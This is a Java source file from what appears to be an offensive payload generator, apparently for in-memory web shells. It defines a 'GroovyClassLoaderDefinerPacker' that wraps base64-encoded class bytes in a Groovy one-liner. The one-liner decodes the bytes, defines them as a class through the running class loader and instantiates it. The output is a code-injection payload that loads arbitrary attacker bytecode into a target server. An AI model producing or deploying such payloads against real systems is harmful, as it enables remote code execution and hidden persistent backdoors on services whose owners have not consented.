package org.leo.jmg.mem.packer.groovy;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;

@PackerMeta(name = "GroovyClassLoaderDefiner", group = "Groovy", order = 3)
public class GroovyClassLoaderDefinerPacker implements Packer {
    String template = "this.getClass().getClassLoader().defineClass(null,'{{base64Str}}'.decodeBase64()).newInstance();";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        return template.replace("{{base64Str}}", config.getClassBytesBase64Str());
    }
}
